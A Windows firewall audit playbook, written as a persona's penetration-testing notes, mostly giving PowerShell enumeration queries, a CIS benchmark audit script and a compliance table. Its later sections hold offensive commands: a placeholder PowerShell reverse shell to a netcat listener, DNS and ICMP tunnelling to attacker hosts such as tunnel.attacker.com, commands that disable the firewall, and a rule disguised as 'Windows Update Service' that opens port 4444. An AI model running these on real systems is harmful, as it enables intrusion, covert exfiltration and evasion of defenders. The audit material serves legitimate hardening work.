# GS-24: Windows Firewall Analysis — Rush's Audit Playbook

> **Classification**: Royal Guard Knowledge Seed
> **Author**: Rush (The Breacher — Network Penetration)
> **Source**: CIS Benchmarks for Windows, Microsoft Security Baselines, NIST SP 800-41
> **Directive**: GS-27 — Every firewall has gaps. Find them all.

---

## 1. Windows Firewall Architecture

Windows Defender Firewall with Advanced Security (WFAS) operates on three profiles:

| Profile | When Active | Default Inbound | Default Outbound |
|---|---|---|---|
| **Domain** | Machine is connected to a domain network | Block | Allow |
| **Private** | User marks network as trusted (Home/Work) | Block | Allow |
| **Public** | Unknown/untrusted networks | Block | Allow |

**Critical default weakness**: Outbound traffic is ALLOWED by default on all profiles. This means any malware, reverse shell, or data exfiltration tool can call home without restriction unless outbound rules are explicitly configured.

---

## 2. Firewall Enumeration — Get-NetFirewallRule

### 2.1 Basic Enumeration

```powershell
# List ALL firewall rules (warning: hundreds of rules)
Get-NetFirewallRule | Format-Table Name, DisplayName, Enabled, Direction, Action -AutoSize

# Count rules by direction and action
Get-NetFirewallRule | Group-Object Direction, Action |
  Select-Object Name, Count | Format-Table -AutoSize

# List only ENABLED rules
Get-NetFirewallRule -Enabled True |
  Format-Table Name, DisplayName, Direction, Action, Profile -AutoSize

# List enabled INBOUND ALLOW rules (attack surface)
Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow |
  Format-Table DisplayName, Profile -AutoSize

# List enabled OUTBOUND BLOCK rules (defensive rules)
Get-NetFirewallRule -Enabled True -Direction Outbound -Action Block |
  Format-Table DisplayName, Profile -AutoSize
```

### 2.2 Detailed Rule Inspection with Filters

```powershell
# Get port filters for a specific rule
$rule = Get-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)"
$rule | Get-NetFirewallPortFilter

# Get address filters (which IPs can connect)
$rule | Get-NetFirewallAddressFilter

# Get application filters (which program is allowed)
$rule | Get-NetFirewallApplicationFilter

# Get service filters
$rule | Get-NetFirewallServiceFilter

# Get interface filters
$rule | Get-NetFirewallInterfaceFilter

# Get security filters (IPsec requirements)
$rule | Get-NetFirewallSecurityFilter
```

### 2.3 Comprehensive Rule Dump

```powershell
# Full detail for all enabled inbound allow rules — the core attack surface
Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow | ForEach-Object {
    $portFilter = $_ | Get-NetFirewallPortFilter
    $addrFilter = $_ | Get-NetFirewallAddressFilter
    $appFilter  = $_ | Get-NetFirewallApplicationFilter

    [PSCustomObject]@{
        Name        = $_.DisplayName
        Profile     = $_.Profile
        Protocol    = $portFilter.Protocol
        LocalPort   = $portFilter.LocalPort
        RemotePort  = $portFilter.RemotePort
        LocalAddr   = $addrFilter.LocalAddress
        RemoteAddr  = $addrFilter.RemoteAddress
        Program     = $appFilter.Program
    }
} | Format-Table -AutoSize
```

### 2.4 netsh Commands (Legacy but Universal)

```cmd
:: Show all profiles and their settings
netsh advfirewall show allprofiles

:: Show specific profile
netsh advfirewall show domainprofile
netsh advfirewall show privateprofile
netsh advfirewall show publicprofile

:: Show current firewall state
netsh advfirewall show currentprofile

:: Export complete firewall policy
netsh advfirewall export "C:\Users\Public\firewall-backup.wfw"

:: List all rules
netsh advfirewall firewall show rule name=all

:: List all inbound allow rules
netsh advfirewall firewall show rule name=all dir=in action=allow

:: Show verbose detail for a rule
netsh advfirewall firewall show rule name="Remote Desktop - User Mode (TCP-In)" verbose
```

---

## 3. Default Weaknesses — What CIS Benchmarks Flag

### 3.1 Outbound Traffic: The Biggest Gap

**CIS Benchmark 9.1.4, 9.2.4, 9.3.4**: "Ensure Windows Firewall: Outbound connections is set to Block"

**Default**: All profiles allow ALL outbound traffic. This means:
- Reverse shells connect back freely
- Data exfiltration goes undetected
- C2 beacons call home without restriction
- DNS tunneling works without any rule changes

**Check**:
```powershell
# Check outbound default action for all profiles
Get-NetFirewallProfile | Select-Object Name, DefaultOutboundAction

# Expected (secure): Block
# Typical (default): Allow
```

**What attackers exploit**: Since outbound is wide open, a reverse shell on any port will work. Common egress ports: 80, 443, 53, 8080. Defenders who do not block outbound traffic have no visibility into exfiltration.

### 3.2 Profile Gaps — Different Rules for Different Profiles

**Problem**: Many administrators only configure the Domain profile and leave Private/Public profiles at defaults. If an attacker can force a network profile change (disconnect from domain, connect to rogue AP), the machine falls back to a weaker profile.

**Check**:
```powershell
# Compare enabled rules across profiles
$profiles = @("Domain", "Private", "Public")
foreach ($profile in $profiles) {
    $count = (Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow |
        Where-Object { $_.Profile -match $profile -or $_.Profile -eq "Any" }).Count
    Write-Output "${profile}: $count inbound allow rules"
}
```

**CIS Benchmark 9.1.1, 9.2.1, 9.3.1**: All three profiles MUST have the firewall enabled.

```powershell
# Verify all profiles are enabled
Get-NetFirewallProfile | Select-Object Name, Enabled

# Check via registry
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" -Name EnableFirewall
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" -Name EnableFirewall
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" -Name EnableFirewall
```

### 3.3 "Any" Profile Rules

Rules with Profile set to "Any" apply across ALL profiles. These are often overly permissive.

```powershell
# Find rules that apply to all profiles
Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow |
  Where-Object { $_.Profile -eq "Any" } |
  Format-Table DisplayName, Profile -AutoSize
```

### 3.4 Rules Allowing "Any" Program

```powershell
# Find inbound allow rules that are not restricted to a specific program
Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow | ForEach-Object {
    $app = ($_ | Get-NetFirewallApplicationFilter).Program
    if ($app -eq "Any" -or $app -eq $null) {
        [PSCustomObject]@{
            Rule    = $_.DisplayName
            Program = "ANY (UNRESTRICTED)"
            Profile = $_.Profile
        }
    }
} | Format-Table -AutoSize
```

### 3.5 Rules Allowing "Any" Remote Address

```powershell
# Find rules allowing connections from any IP
Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow | ForEach-Object {
    $addr = ($_ | Get-NetFirewallAddressFilter).RemoteAddress
    if ($addr -eq "Any" -or $addr -contains "Any") {
        $port = ($_ | Get-NetFirewallPortFilter).LocalPort
        [PSCustomObject]@{
            Rule       = $_.DisplayName
            RemoteAddr = "ANY (WORLD-ACCESSIBLE)"
            Port       = $port
            Profile    = $_.Profile
        }
    }
} | Format-Table -AutoSize
```

---

## 4. Application-Based Bypass

### 4.1 How App-Based Rules Work

Windows Firewall can allow traffic based on the executable path, not just ports. If a rule allows `C:\Program Files\SomeApp\app.exe` to receive inbound connections on any port, then compromising that application gives you a firewall bypass.

### 4.2 Finding App-Based Rules

```powershell
# List all application-specific inbound rules
Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow | ForEach-Object {
    $app = ($_ | Get-NetFirewallApplicationFilter).Program
    if ($app -ne "Any" -and $app -ne $null -and $app -ne "") {
        [PSCustomObject]@{
            Rule    = $_.DisplayName
            Program = $app
            Profile = $_.Profile
        }
    }
} | Sort-Object Program | Format-Table -AutoSize
```

### 4.3 Exploiting App-Based Rules

**Scenario**: A rule allows `C:\Program Files\SomeApp\update.exe` inbound on any port.

**Attack vectors**:
1. **DLL hijacking**: Place a malicious DLL in the app's directory that gets loaded by update.exe
2. **Binary replacement**: If you can write to the app directory, replace update.exe with your payload (same name)
3. **Path traversal**: If the rule uses a relative path or environment variable, abuse it
4. **Living off the land**: If rules allow `svchost.exe`, `powershell.exe`, or other LOLBins, use them for tunneling

### 4.4 Common LOLBin Firewall Rules

These built-in Windows binaries often have firewall allow rules:

```powershell
# Check for LOLBin rules
$lolbins = @("powershell.exe", "cmd.exe", "mshta.exe", "wscript.exe", "cscript.exe",
              "rundll32.exe", "svchost.exe", "msiexec.exe", "certutil.exe")

Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow | ForEach-Object {
    $app = ($_ | Get-NetFirewallApplicationFilter).Program
    foreach ($lol in $lolbins) {
        if ($app -match [regex]::Escape($lol)) {
            [PSCustomObject]@{
                Rule    = $_.DisplayName
                LOLBin  = $app
                Profile = $_.Profile
            }
        }
    }
} | Format-Table -AutoSize
```

---

## 5. Full Audit Script

This comprehensive audit script checks everything CIS Benchmarks recommend and flags issues.

```powershell
#Requires -RunAsAdministrator
# ============================================================================
# RUSH'S WINDOWS FIREWALL AUDIT SCRIPT
# Source: CIS Benchmarks for Windows, adapted for offensive analysis
# Usage: Run as Administrator on the target Windows machine
# Output: Console report + CSV export
# ============================================================================

$ErrorActionPreference = "SilentlyContinue"
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$reportPath = "C:\Users\Public\firewall-audit-$timestamp"
New-Item -ItemType Directory -Path $reportPath -Force | Out-Null

Write-Host "============================================" -ForegroundColor Cyan
Write-Host " RUSH'S WINDOWS FIREWALL AUDIT" -ForegroundColor Cyan
Write-Host " $(Get-Date)" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan

# ---- SECTION 1: Profile Status ----
Write-Host "`n[1] FIREWALL PROFILE STATUS" -ForegroundColor Yellow
Write-Host "-------------------------------------------"

$profiles = Get-NetFirewallProfile
$profileResults = @()

foreach ($p in $profiles) {
    $status = if ($p.Enabled) { "ENABLED" } else { "DISABLED [CRITICAL]" }
    $color  = if ($p.Enabled) { "Green" } else { "Red" }

    $inbound  = $p.DefaultInboundAction
    $outbound = $p.DefaultOutboundAction
    $outColor = if ($outbound -eq "Block") { "Green" } else { "Red" }

    Write-Host "  $($p.Name) Profile:" -ForegroundColor White
    Write-Host "    State:            $status" -ForegroundColor $color
    Write-Host "    Default Inbound:  $inbound" -ForegroundColor Green
    Write-Host "    Default Outbound: $outbound" -ForegroundColor $outColor
    Write-Host "    Log Allowed:      $($p.LogAllowed)" -ForegroundColor $(if($p.LogAllowed -eq "True"){"Green"}else{"Red"})
    Write-Host "    Log Blocked:      $($p.LogBlocked)" -ForegroundColor $(if($p.LogBlocked -eq "True"){"Green"}else{"Red"})
    Write-Host "    Log File:         $($p.LogFileName)"
    Write-Host "    Log Max Size:     $($p.LogMaxSizeKilobytes) KB"
    Write-Host "    Notification:     $($p.NotifyOnListen)"

    $profileResults += [PSCustomObject]@{
        Profile         = $p.Name
        Enabled         = $p.Enabled
        DefaultInbound  = $inbound
        DefaultOutbound = $outbound
        LogAllowed      = $p.LogAllowed
        LogBlocked      = $p.LogBlocked
        LogFile         = $p.LogFileName
        LogMaxSizeKB    = $p.LogMaxSizeKilobytes
    }
}

$profileResults | Export-Csv "$reportPath\01-profiles.csv" -NoTypeInformation

# ---- SECTION 2: Inbound Allow Rules (Attack Surface) ----
Write-Host "`n[2] INBOUND ALLOW RULES (ATTACK SURFACE)" -ForegroundColor Yellow
Write-Host "-------------------------------------------"

$inboundAllow = Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow
$inboundDetails = @()

foreach ($rule in $inboundAllow) {
    $port = $rule | Get-NetFirewallPortFilter
    $addr = $rule | Get-NetFirewallAddressFilter
    $app  = $rule | Get-NetFirewallApplicationFilter

    $entry = [PSCustomObject]@{
        DisplayName = $rule.DisplayName
        Profile     = $rule.Profile
        Protocol    = $port.Protocol
        LocalPort   = $port.LocalPort
        RemotePort  = $port.RemotePort
        RemoteAddr  = $addr.RemoteAddress
        LocalAddr   = $addr.LocalAddress
        Program     = $app.Program
        Service     = ($rule | Get-NetFirewallServiceFilter).Service
    }
    $inboundDetails += $entry
}

Write-Host "  Total enabled inbound ALLOW rules: $($inboundDetails.Count)" -ForegroundColor White

# Flag world-accessible rules
$worldAccessible = $inboundDetails | Where-Object { $_.RemoteAddr -eq "Any" -or $_.RemoteAddr -contains "Any" }
Write-Host "  World-accessible rules (RemoteAddr=Any): $($worldAccessible.Count)" -ForegroundColor $(if($worldAccessible.Count -gt 0){"Red"}else{"Green"})

# Flag unrestricted program rules
$anyProgram = $inboundDetails | Where-Object { $_.Program -eq "Any" -or $_.Program -eq $null -or $_.Program -eq "" }
Write-Host "  Rules without program restriction: $($anyProgram.Count)" -ForegroundColor $(if($anyProgram.Count -gt 5){"Red"}else{"Yellow"})

$inboundDetails | Export-Csv "$reportPath\02-inbound-allow.csv" -NoTypeInformation

# ---- SECTION 3: Outbound Rules Analysis ----
Write-Host "`n[3] OUTBOUND RULES ANALYSIS" -ForegroundColor Yellow
Write-Host "-------------------------------------------"

$outboundBlock = Get-NetFirewallRule -Enabled True -Direction Outbound -Action Block
$outboundAllow = Get-NetFirewallRule -Enabled True -Direction Outbound -Action Allow

Write-Host "  Outbound BLOCK rules: $($outboundBlock.Count)" -ForegroundColor $(if($outboundBlock.Count -gt 0){"Green"}else{"Red"})
Write-Host "  Outbound ALLOW rules: $($outboundAllow.Count)" -ForegroundColor White

if ($outboundBlock.Count -eq 0) {
    Write-Host "  [CRITICAL] No outbound blocking rules exist!" -ForegroundColor Red
    Write-Host "  [CRITICAL] Reverse shells and exfiltration are unrestricted!" -ForegroundColor Red
}

# ---- SECTION 4: High-Risk Port Exposure ----
Write-Host "`n[4] HIGH-RISK PORT EXPOSURE" -ForegroundColor Yellow
Write-Host "-------------------------------------------"

$riskyPorts = @{
    "21"    = "FTP"
    "22"    = "SSH"
    "23"    = "Telnet"
    "25"    = "SMTP"
    "53"    = "DNS"
    "80"    = "HTTP"
    "110"   = "POP3"
    "135"   = "RPC"
    "137"   = "NetBIOS"
    "138"   = "NetBIOS"
    "139"   = "NetBIOS"
    "389"   = "LDAP"
    "443"   = "HTTPS"
    "445"   = "SMB"
    "1433"  = "MSSQL"
    "1434"  = "MSSQL Browser"
    "3306"  = "MySQL"
    "3389"  = "RDP"
    "5432"  = "PostgreSQL"
    "5900"  = "VNC"
    "5985"  = "WinRM HTTP"
    "5986"  = "WinRM HTTPS"
    "8080"  = "HTTP Alt"
    "8443"  = "HTTPS Alt"
}

foreach ($rule in $inboundDetails) {
    $ports = @()
    if ($rule.LocalPort) {
        $ports = $rule.LocalPort -split ","
    }
    foreach ($p in $ports) {
        $p = $p.Trim()
        if ($riskyPorts.ContainsKey($p)) {
            $exposure = if ($rule.RemoteAddr -eq "Any" -or $rule.RemoteAddr -contains "Any") { "WORLD" } else { "SCOPED" }
            $color = if ($exposure -eq "WORLD") { "Red" } else { "Yellow" }
            Write-Host "  Port $p ($($riskyPorts[$p])): $($rule.DisplayName) [$exposure]" -ForegroundColor $color
        }
    }
}

# ---- SECTION 5: LOLBin Rules ----
Write-Host "`n[5] LOLBIN FIREWALL RULES" -ForegroundColor Yellow
Write-Host "-------------------------------------------"

$lolbins = @("powershell.exe", "cmd.exe", "mshta.exe", "wscript.exe", "cscript.exe",
             "rundll32.exe", "msiexec.exe", "certutil.exe", "regsvr32.exe", "bitsadmin.exe",
             "installutil.exe", "msbuild.exe")

$lolbinRules = @()
foreach ($rule in $inboundDetails) {
    foreach ($lol in $lolbins) {
        if ($rule.Program -match [regex]::Escape($lol)) {
            Write-Host "  [WARNING] $lol allowed inbound: $($rule.DisplayName)" -ForegroundColor Red
            $lolbinRules += $rule
        }
    }
}

if ($lolbinRules.Count -eq 0) {
    Write-Host "  No LOLBin inbound rules found." -ForegroundColor Green
}

# ---- SECTION 6: Profile Consistency Check ----
Write-Host "`n[6] PROFILE CONSISTENCY CHECK" -ForegroundColor Yellow
Write-Host "-------------------------------------------"

$domainRules  = (Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow |
    Where-Object { $_.Profile -match "Domain" }).Count
$privateRules = (Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow |
    Where-Object { $_.Profile -match "Private" }).Count
$publicRules  = (Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow |
    Where-Object { $_.Profile -match "Public" }).Count
$anyRules     = (Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow |
    Where-Object { $_.Profile -eq "Any" }).Count

Write-Host "  Domain profile inbound allow:  $domainRules (+ $anyRules from 'Any')" -ForegroundColor White
Write-Host "  Private profile inbound allow: $privateRules (+ $anyRules from 'Any')" -ForegroundColor White
Write-Host "  Public profile inbound allow:  $publicRules (+ $anyRules from 'Any')" -ForegroundColor White

if ($publicRules -gt $domainRules) {
    Write-Host "  [WARNING] Public profile has MORE allow rules than Domain!" -ForegroundColor Red
}

# ---- SECTION 7: IPsec / Authentication Rules ----
Write-Host "`n[7] IPSEC / AUTHENTICATION RULES" -ForegroundColor Yellow
Write-Host "-------------------------------------------"

$authRules = Get-NetFirewallRule -Enabled True | ForEach-Object {
    $sec = $_ | Get-NetFirewallSecurityFilter
    if ($sec.Authentication -ne "NotRequired") {
        [PSCustomObject]@{
            Rule           = $_.DisplayName
            Direction      = $_.Direction
            Authentication = $sec.Authentication
            Encryption     = $sec.Encryption
        }
    }
}

if ($authRules) {
    $authRules | Format-Table -AutoSize
} else {
    Write-Host "  No IPsec-authenticated rules found." -ForegroundColor Yellow
}

# ---- SECTION 8: Listening Ports vs Firewall Rules ----
Write-Host "`n[8] LISTENING PORTS WITHOUT MATCHING ALLOW RULES" -ForegroundColor Yellow
Write-Host "-------------------------------------------"

$listening = Get-NetTCPConnection -State Listen |
    Select-Object LocalPort, OwningProcess -Unique |
    Sort-Object LocalPort

$allowedPorts = @()
foreach ($rule in $inboundDetails) {
    if ($rule.LocalPort -and $rule.LocalPort -ne "Any") {
        $allowedPorts += ($rule.LocalPort -split ",").Trim()
    }
}
$allowedPorts = $allowedPorts | Select-Object -Unique

foreach ($l in $listening) {
    $port = $l.LocalPort.ToString()
    $proc = (Get-Process -Id $l.OwningProcess -ErrorAction SilentlyContinue).ProcessName
    if ($port -notin $allowedPorts) {
        Write-Host "  Port $port ($proc) - listening but NO explicit allow rule" -ForegroundColor Yellow
    }
}

# ---- SUMMARY ----
Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host " AUDIT SUMMARY" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan

$findings = @()
foreach ($p in $profiles) {
    if (-not $p.Enabled) { $findings += "[CRITICAL] $($p.Name) profile is DISABLED" }
    if ($p.DefaultOutboundAction -ne "Block") { $findings += "[HIGH] $($p.Name) outbound default is ALLOW (should be Block)" }
    if ($p.LogAllowed -ne "True") { $findings += "[MEDIUM] $($p.Name) does not log allowed connections" }
    if ($p.LogBlocked -ne "True") { $findings += "[MEDIUM] $($p.Name) does not log blocked connections" }
}

if ($worldAccessible.Count -gt 0) { $findings += "[HIGH] $($worldAccessible.Count) rules accessible from ANY remote address" }
if ($lolbinRules.Count -gt 0) { $findings += "[HIGH] $($lolbinRules.Count) LOLBin inbound rules found" }
if ($outboundBlock.Count -eq 0) { $findings += "[CRITICAL] No outbound blocking rules — exfiltration unrestricted" }

foreach ($f in $findings) {
    $color = if ($f -match "CRITICAL") { "Red" } elseif ($f -match "HIGH") { "Red" } else { "Yellow" }
    Write-Host "  $f" -ForegroundColor $color
}

Write-Host "`n  Report exported to: $reportPath" -ForegroundColor Green
Write-Host "  Files: 01-profiles.csv, 02-inbound-allow.csv" -ForegroundColor Green
Write-Host "============================================`n" -ForegroundColor Cyan
```

---

## 6. Remote Firewall Enumeration (From Attacker)

### 6.1 Via WMI

```powershell
# Remote firewall query via WMI
Get-CimInstance -Namespace root\StandardCimv2 -ClassName MSFT_NetFirewallRule -ComputerName TARGET -Credential (Get-Credential) |
  Where-Object { $_.Enabled -eq 1 -and $_.Direction -eq 1 -and $_.Action -eq 2 } |
  Select-Object DisplayName
```

### 6.2 Via CrackMapExec

```bash
# Execute firewall enumeration remotely
crackmapexec smb 172.16.1.100 -u admin -p 'Pass123' -x "netsh advfirewall show allprofiles"
crackmapexec smb 172.16.1.100 -u admin -p 'Pass123' -x "netsh advfirewall firewall show rule name=all dir=in action=allow"
```

### 6.3 Via Evil-WinRM

```bash
evil-winrm -i 172.16.1.100 -u admin -p 'Pass123'
# Then run any PowerShell commands from sections above
```

### 6.4 Port Scanning to Infer Firewall Rules

```bash
# Quick scan to see what the firewall allows
nmap -sT -Pn -n 172.16.1.100 -p 21,22,23,25,53,80,110,135,139,389,443,445,1433,3306,3389,5432,5900,5985,8080

# Full port scan (slower, comprehensive)
nmap -sT -Pn -n 172.16.1.100 -p- --min-rate 5000

# Compare open ports with listening ports (from inside) to identify filtered ports
```

---

## 7. Firewall Bypass Techniques

### 7.1 Outbound Egress on Allowed Ports

Since most firewalls allow outbound 80 and 443:
```bash
# Attacker: listen on port 443
nc -lvnp 443

# Target: reverse shell on 443
powershell -e <base64-encoded-reverse-shell-to-port-443>
```

### 7.2 DNS Tunneling (Port 53 Almost Always Allowed)

```bash
# Using dnscat2
# Attacker:
dnscat2-server tunnel.attacker.com

# Target:
dnscat2 tunnel.attacker.com
```

### 7.3 ICMP Tunneling

```bash
# Using icmpsh (when even DNS is blocked)
# Attacker:
python3 icmpsh_m.py 10.10.14.5 172.16.1.100

# Target:
icmpsh.exe -t 10.10.14.5
```

### 7.4 Disabling the Firewall (With Admin Access)

```powershell
# Nuclear option — disable all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Or via netsh
netsh advfirewall set allprofiles state off

# Add a rule instead (stealthier)
New-NetFirewallRule -DisplayName "Windows Update Service" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444
```

### 7.5 Modifying Existing Rules

```powershell
# Add port 4444 to an existing rule (blends in)
Set-NetFirewallRule -DisplayName "Core Networking - DNS (UDP-In)" -LocalPort @("53","4444") -Protocol Any
```

---

## 8. CIS Benchmark Compliance Checklist

| CIS Control | Check | Secure Value |
|---|---|---|
| 9.1.1 | Domain profile enabled | True |
| 9.1.2 | Domain inbound default | Block |
| 9.1.3 | Domain outbound default | Block |
| 9.1.4 | Domain log dropped packets | Yes, >= 16384 KB |
| 9.1.5 | Domain log successful connections | Yes |
| 9.2.1 | Private profile enabled | True |
| 9.2.2 | Private inbound default | Block |
| 9.2.3 | Private outbound default | Block |
| 9.3.1 | Public profile enabled | True |
| 9.3.2 | Public inbound default | Block |
| 9.3.3 | Public outbound default | Block |
| 9.3.4 | Public display notification | No (prevents info leak) |

---

## 9. Quick-Reference: One-Liners for Common Audit Tasks

```powershell
# Is the firewall actually on?
(Get-NetFirewallProfile).Enabled

# What can the world reach?
Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow | Get-NetFirewallAddressFilter | Where-Object { $_.RemoteAddress -eq "Any" }

# What ports are exposed?
Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow | Get-NetFirewallPortFilter | Where-Object { $_.LocalPort -ne "Any" } | Select-Object LocalPort -Unique | Sort-Object LocalPort

# Any outbound restrictions?
(Get-NetFirewallRule -Enabled True -Direction Outbound -Action Block).Count

# Export everything for offline analysis
Get-NetFirewallRule | Export-Csv C:\Users\Public\all-rules.csv -NoTypeInformation
```

---

*Rush does not break firewalls. He reads them, finds the gaps they were born with, and walks through. Every default is a door. Every oversight is an invitation.*
